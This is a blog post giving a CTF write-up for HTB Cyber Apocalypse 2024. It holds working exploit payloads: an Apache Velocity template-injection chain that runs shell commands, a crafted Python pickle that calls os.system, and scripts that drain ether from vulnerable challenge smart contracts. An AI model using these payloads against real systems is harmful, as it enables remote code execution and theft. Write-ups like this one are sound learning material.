@@ -1,0 +1,704 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>HTB Cyber Apocalypse CTF 2024 Writeup</title>
+		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		
+		<style>/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+* { box-sizing: border-box; }
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #082840;
+	--text-color-link-active: #5f2b48;
+	--text-color-link-visited: #17050F;
+
+	--syntax-tab-size: 2;
+
+	--pinyin-font: 'Arima Madurai';
+}
+
+@media (prefers-color-scheme: dark) {
+	:root {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		/* --text-color is assigned to --color-gray-_ above */
+		--text-color-link: #1493fb;
+		--text-color-link-active: #6969f7;
+		--text-color-link-visited: #a6a6f8;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 55em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+header:after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.links-nextprev {
+	list-style: none;
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+}
+code {
+	word-break: break-all;
+}
+p > code {
+	color: #722;
+	text-decoration: underline #7222;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em .5em;
+	flex-wrap: wrap;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+	margin-right: 2em;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+	margin-right: 1em;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+/* Direct Links / Markdown Headers */
+.header-anchor {
+	text-decoration: none;
+	font-style: normal;
+	font-size: 1em;
+	margin-left: .1em;
+}
+a[href].header-anchor,
+a[href].header-anchor:visited {
+	color: transparent;
+}
+a[href].header-anchor:focus,
+a[href].header-anchor:hover {
+	text-decoration: underline;
+}
+a[href].header-anchor:focus,
+:hover > a[href].header-anchor {
+	color: #aaa;
+}
+
+h2 + .header-anchor {
+	font-size: 1.5em;
+}
+
+.pyin {
+	font-family: var(--pinyin-font), cursive;
+}
+
+figure {
+	margin: -1.7em 0 0.7em 0;
+}
+
+figcaption {
+	font-style: italic;
+}
+
+figure img {
+	border: 1px solid #ccc;
+}</style>
+		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
+	</head>
+	<body>
+		<a href="#skip" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
+			<nav>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About Me</a></li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="skip">
+			
+<h1>HTB Cyber Apocalypse CTF 2024 Writeup</h1>
+
+<ul class="post-metadata">
+	<li><time datetime="2024-03-14">2024年03月</time></li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/ctf/" class="post-tag">ctf</a></li>
+</ul>
+
+<p>I had very little time to spend on HTB Cyber Apocalypse 2024, so just played with some easy challenges.</p>
+<h2 id="web-labyrinth-linguist" tabindex="-1">Web: Labyrinth Linguist <a class="header-anchor" href="#web-labyrinth-linguist">#</a></h2>
+<p>(Easy, 300)</p>
+<p>Java. Apache Velocity 1.7.0. There is a template injection vulnerability.</p>
+<p>I tried using <code>#include</code> and <code>#parse</code> directives, but I couldn't get a path traversal.</p>
+<p>According to the code, we have one variable in our context: if you send <code>$name</code> you get back <code>World</code>.</p>
+<p>More interestingly, <code>${name.getClass()}</code>returns <code>class java.lang.String</code>. From here we can pretty much do anything we want. Calling a shell command in Java is annoying, but here is one way to get the file listing of the root directory:</p>
+<pre class="language-velocity" tabindex="0"><code class="language-velocity"><span class="token directive"><span class="token keyword">#set</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$<span class="token punctuation">{</span>name<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span></span>
+<span class="token variable">$<span class="token punctuation">{</span>x<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>
+<span class="token directive"><span class="token keyword">#set</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$<span class="token punctuation">{</span>name<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.io.InputStreamReader"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span></span>
+<span class="token directive"><span class="token keyword">#set</span></span> (<span class="token variable">$b</span>=<span class="token variable">$<span class="token punctuation">{</span>name<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.io.BufferedReader"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>$c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>$x<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>)
+<span class="token variable">$<span class="token punctuation">{</span>b<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>
+<span class="token variable">$<span class="token punctuation">{</span>b<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>
+<span class="token variable">$<span class="token punctuation">{</span>b<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span></code></pre>
+<p>Then cat the flag.</p>
+<p>I'm not sure if the declared constructor indices are portable across different machines or even survive restarts.</p>
+<h2 id="forensics-phreaky" tabindex="-1">Forensics: Phreaky <a class="header-anchor" href="#forensics-phreaky">#</a></h2>
+<p>(Medium, 300)</p>
+<p>Browsing the pcap in Wireshark, the SMTP traffic stood out, with 15 messages of the format:</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">Date: Wed, 06 Mar 2024 14:59:12 +0000
+From: caleb@thephreaks.com(Caleb)
+To: resources@thetalents.com
+Subject: Secure File Transfer
+Message-ID: <20240306145912.3RkED%caleb@thephreaks.com>
+User-Agent: s-nail v14.9.23
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary="=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-="
+
+This is a multi-part message in MIME format.
+
+--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-ID: <20240306145912.g2I1r%caleb@thephreaks.com>
+
+Attached is a part of the file. Password: S3W8yzixNoL8
+
+--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=
+Content-Type: application/zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; 
+ filename*0="caf33472c6e0b2de339c1de893f78e67088cd6b1586a581c6f8e87b5596";
+ filename*1="efcfd.zip"
+Content-ID: <20240306145912.Emuab%caleb@thephreaks.com>
+
+UEsDBBQACQAIAGZ3ZlhwRyBT2gAAAN0AAAAWABwAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUCQAD
+wIToZcCE6GV1eAsAAQToAwAABOgDAAA9mPwEVmy1t/sLJ62NzXeCBFSSSZppyIzvPXL++cJbuCeL
+nP4XXiAK9/HZL9xRw4LjlDf5eDd6BgBOKZqSn6qpM6g1WKXriS7k3lx5VkNnqlqQIfYnUdOCnkD/
+1vzCyhuGdHPia5lmy0HoG+qdXABlLyNDgxvB9FTOcXK7oDHBOf3kmLSQFdxXsjfooLtBtC+y4gdB
+xB4V3bImQ8TB5sPY55dvEKWCJ34CzRJbgIIirkD2GDIoQEHznvJA7zNnOvce1hXGA2+P/XmHe+4K
+tL/fmrWMVpQEd+/GQlBLBwhwRyBT2gAAAN0AAABQSwECHgMUAAkACABmd2ZYcEcgU9oAAADdAAAA
+FgAYAAAAAAAAAAAAtIEAAAAAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUBQADwIToZXV4CwABBOgD
+AAAE6AMAAFBLBQYAAAAAAQABAFwAAAA6AQAAAAA=
+
+--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=--</code></pre>
+<p>This message is reassembled from multiple SMTP packets, so exporting the SMTP packets will be a bit of a mess with packet headers in the middle.</p>
+<p>Instead, use the <code>imf</code> filter in Wireshark and then File &gt; Export Objects &gt; IMF to get the <code>.eml</code> files. On the CLI, this is:</p>
+<pre class="language-bash" tabindex="0"><code class="language-bash">tshark <span class="token parameter variable">-r</span> phreaky.pcap --export-objects imf,.</code></pre>
+<p>The zip file is password-protected. Each one contains a phreaks_plan.pdf.part1 file.</p>
+<pre class="language-bash" tabindex="0"><code class="language-bash"><span class="token comment"># Get all the parts</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">f</span> <span class="token keyword">in</span> *.eml<span class="token punctuation">;</span>
+<span class="token keyword">do</span> <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> <span class="token string">"<span class="token variable">$f</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'assword:'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/^.*: //g'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\r'</span><span class="token variable">)</span></span><span class="token punctuation">;</span>
+<span class="token function">cat</span> <span class="token variable">$f</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'/^UEs/,/^\s$/{p}'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'^...'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\r'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">></span> tmp.zip<span class="token punctuation">;</span>
+<span class="token function">unzip</span> <span class="token parameter variable">-P</span> <span class="token string">"<span class="token environment constant">$PWD</span>"</span> tmp.zip<span class="token punctuation">;</span>
+<span class="token keyword">done</span>
+
+<span class="token comment"># Reassemble PDF</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">15</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cat</span> <span class="token string">"phreaks_plan.pdf.part<span class="token variable">$i</span>"</span> <span class="token operator">>></span> final.pdf<span class="token punctuation">;</span> <span class="token keyword">done</span></code></pre>
+<p>The flag is shown within the pdf.</p>
+<h2 id="blockchain-russian-roulette" tabindex="-1">Blockchain: Russian Roulette <a class="header-anchor" href="#blockchain-russian-roulette">#</a></h2>
+<p>(Very easy, 300)</p>
+<p>One server is an ethereum network RPC server. The other is for the challenge:</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">$ nc 94.237.60.74 59101
+1 - Connection information
+2 - Restart Instance
+3 - Get flag
+action? 1
+
+Private key: 0xf7ddb435cbfdbf8287f834b2d65fa3fcef714e0897a840befdd77869a9558524
+Address: 0x5b4F2566D787E7F793D6f51f60Fea29E29464374
+Target contract: 0xab6cA8131A2FF2002bebeB52dfc9E2F716c116BA
+Setup contract: 0xA0DadA13fe4C906474AcD7BE42d356631c4f459F</code></pre>
+<p>The contract Setup has deployed a RussianRoulette contract instance with 10 ETH.
+The contract RussianRoulette contract has a <code>pullTrigger</code> function. If the condition that <code>uint256(blockhash(block.number - 1)) % 10 == 7</code>, is satisfied (random with a 10% chance of being hit), the contract will self-destruct and send those 10 ETH to the caller <code>selfdestruct(payable(msg.sender))</code>.</p>
+<p>Simply calling the contract several times will eventually pass the condition.</p>
+<p>Use npm to install <code>eth-cli</code>. Add the network <code>eth network:add HTB --id=69 --label=HTB --url=http://94.237.60.74:42487</code>.</p>
+<p>Compile the contracts... can use remix IDE. All we need is the ABI. Save the ABI files. Then in the REPL call the contract until success. I chose a large gas amount (lower amounts failed).</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">$ eth repl -n HTB --pk 0xf7ddb435cbfdbf8287f834b2d65fa3fcef714e0897a840befdd77869a9558524 ./RussianRoulette.abi@0xab6cA8131A2FF2002bebeB52dfc9E2F716c116BA ./Setup.abi@0xA0DadA13fe4C906474AcD7BE42d356631c4f459F
+
+HTB> Setup.methods.isSolved()
+false
+HTB> RussianRoulette.methods.pullTrigger().send({from: "0x5b4F2566D787E7F793D6f51f60Fea29E29464374", gas: 214320})
+{
+  transactionHash: '0x6dc3f0ac880fe583a910ccfdafe3e6a270cb1caaed97867c81cde38cdc2860f4',
+  transactionIndex: 0,
+  blockHash: '0xb6bc29b9228d35401350d64b5ec084d4bfee5744b30723de2e9283fcfcbe0773',
+  blockNumber: 2,
+  cumulativeGasUsed: 21720,
+  gasUsed: 21720,
+  effectiveGasPrice: '0x3b9aca00',
+  from: '0x5b4f2566d787e7f793d6f51f60fea29e29464374',
+  to: '0xab6ca8131a2ff2002bebeb52dfc9e2f716c116ba',
+  contractAddress: null,
+  logsBloom: '0x000000...0000',
+  status: true,
+  type: '0x0',
+  depositNonce: null,
+  events: {}
+}
+HTB> setup.methods.isSolved()
+false
+HTB> BigInt('0xb6bc29b9228d35401350d64b5ec084d4bfee5744b30723de2e9283fcfcbe0773') % BigInt(10)
+7n    /* so will succeed on next call */
+HTB> RussianRoulette.methods.pullTrigger().send({from: "0x5b4F2566D787E7F793D6f51f60Fea29E29464374", gas: 214320})
+{...}
+HTB> setup.methods.isSolved()
+true</code></pre>
+<p>For some reason, when trying to use Remix + Metamask to call the functions, each time we successfully hit the success condition there was some error. Using <code>eth-cli</code>, however, seemed to work.</p>
+<h2 id="blockchain-lucky-faucet" tabindex="-1">Blockchain: Lucky Faucet <a class="header-anchor" href="#blockchain-lucky-faucet">#</a></h2>
+<p>(Easy, 325)</p>
+<p>You can slowly extract money from the contract, but if you use it as expected you can only get 100M wei == 0.1 Gwei == 0.0000000001 ETH (1 ETH = 10^18 wei) at a time which is completely infeasible. We need to drain at least 10 ETH to get the flag. Clearly the challenge has something to do with overflows and casting negative signed ints into uints.</p>
+<pre class="language-solidity" tabindex="0"><code class="language-solidity"><span class="token builtin">int256</span> randomInt <span class="token operator">=</span> <span class="token builtin">int256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Blockhash is a bytes32 which is usually interpreted as a <code>uint256</code>. By using a <code>int256</code> instead, a blockhash which begins with one of <code>[89abcdef]</code> will be negative (two's complement). For now let's assume we can't control the blockhash, but there is a 50% chance of it being a negative after each transaction.</p>
+<p>e.g. a blockhash of <code>0xffecd3bfdf712b3eec84f84ee44d6581580974c75b62b1d63deaf7f1f3103302</code> is:</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">int256: -33875499935385412712089846607188198242036215631542560527268567685192994046
+uint256: 115758213737380810010858895162080719655027948450009021478930315440227936645890</code></pre>
+<p>Double-check the mod maths:</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">123 % 10 == 3
+-123 % 10 == -3
+123 % -10 == 3
+-123 % -10 == -3</code></pre>
+<p>Actually, realise that we can set the bounds to be negative as well, as long as the conditions are met.</p>
+<p>In this way, we can use a very small positive upper bound like +2 and a slightly larger negative bound like -40,000 to ensure that on each call of the contract method we have <code>randomInt % (upperBound - lowerBound + 1) + lowerBound</code> being a small negative number (small chance that <code>lowerBound</code> is smaller in magnitude than <code>randomInt % (upperBound - lowerBound + 1)</code>).</p>
+<pre class="language-js" tabindex="0"><code class="language-js">luckyFaucet<span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">setBounds</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">from</span><span class="token operator">:</span> me<span class="token punctuation">,</span> <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">20000000</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+<p>When converted with <code>uint64(-value)</code> the amount becomes <code>(2 &lt;&lt; 64) - value</code> which is approximately 18.4 ETH. We can therefore run the contract method multiple times with a very high chance of extracting 18.4 ETH each time.</p>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">HTB> eth.getBalance(luckyFaucet._address)
+'500000000000000000000'   // 500 ETH
+
+HTB> eth.getBalance(me)
+'4999999928819000000000'  // 5000 ETH</code></pre>
+<pre class="language-js" tabindex="0"><code class="language-js"><span class="token keyword">function</span> <span class="token function">doit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>counter <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// about 30 so we don't run forever</span>
+    luckyFaucet<span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">sendRandomETH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">from</span><span class="token operator">:</span> me<span class="token punctuation">,</span> <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">2000000</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>doit<span class="token punctuation">)</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<pre class="language-notsure" tabindex="0"><code class="language-notsure">HTB> eth.getBalance(luckyFaucet._address)
+'481553255926290448625'   // 482 ETH
+
+HTB> eth.getBalance(me)
+'5018446618094709551375'  // 5018 ETH
+
+...
+
+HTB> eth.getBalance(luckyFaucet._address)
+'463106511852580897550'   // 463 ETH
+
+HTB> eth.getBalance(me)
+'5036893331705419102450'  // 5037 ETH
+
+...
+...
+
+HTB> eth.getBalance(luckyFaucet._address)
+'1937910009842115787'     // 2 ETH
+
+HTB> eth.getBalance(me)
+'5498060958732157884213'  // 5498 ETH
+
+HTB> setup.methods.isSolved()
+true</code></pre>
+<p>It seems impossible to grab the remaining 2 ETH from this point. The smallest amount we can request (by setting lower and upper bounds to both be equal to -2^63) is 2^63 = 0b10000000... = 9,223,372,036,854,775,808 = 9.2 ETH. Anyway, the challenge only requires 10 ETH to be extracted. The largest is 18,446,744,073,709,551,615 = 18.4 ETH by setting the bounds to be equal to -1 (approx what was done above, but a more sensible way to do it).</p>
+<p>By having set the extracted amount to a factor of 500 such as 10 ETH each time from the start (bounds = -(2^64 - 10^19) = -8446744073709551616), we would have been able to extract every last wei of cryptocash.</p>
+<h2 id="were-pickle-phreaks-revenge" tabindex="-1">We're Pickle Phreaks &amp; Revenge <a class="header-anchor" href="#were-pickle-phreaks-revenge">#</a></h2>
+<p>We have a <code>pickle.Unpickler</code> with a <code>find_class(self, module, name)</code> which restricts <code>module</code> to <code>__main__</code> or <code>app</code> and prevents <code>name</code> from starting with <code>__builtins__</code>.</p>
+<p>We notice that <code>app</code> imports <code>random</code> which itself imports <code>os</code>, so we can call <code>app.random._os.system(&quot;cat flag.txt&quot;)</code>. I made a pickle:</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token string">b'capp\nrandom._os.system\n'</span>
+<span class="token operator">+</span>   <span class="token string">b'Vcat flag.txt\n'</span>
+<span class="token operator">+</span> <span class="token string">b'\x85R'</span>
+<span class="token operator">+</span> <span class="token string">b'.'</span></code></pre>
+<p>The <code>c</code> opcode, defined in <a href="https://github.com/python/cpython/blob/9a388b9a64927c372d85f0eaec3de9b7320a6fb5/Lib/pickletools.py#L1923-L1939">pickletools.py</a> should load an object onto the stack. But it didn't work because it was not calling <code>find_class</code> recursively. Instead, it complains that it can't find <code>random._os.system</code>. The reason is that we haven't set the <a href="https://github.com/python/cpython/blob/aa7bcf284f006434b07839d82f325618f7a5c06c/Lib/pickle.py#L1575">pickle protocol level to 4 or higher</a> which then enables the recursive code path. A quick and dirty way to do that is prepending the following header:</p>
+<pre class="language-python" tabindex="0"><code class="language-python">header <span class="token operator">=</span> <span class="token string">b'\x80\x05\x95'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00\x00\x00\x00\x00\x00\x00'</span></code></pre>
+<p>In &quot;revenge&quot;, the <code>random</code> module is banned.</p>
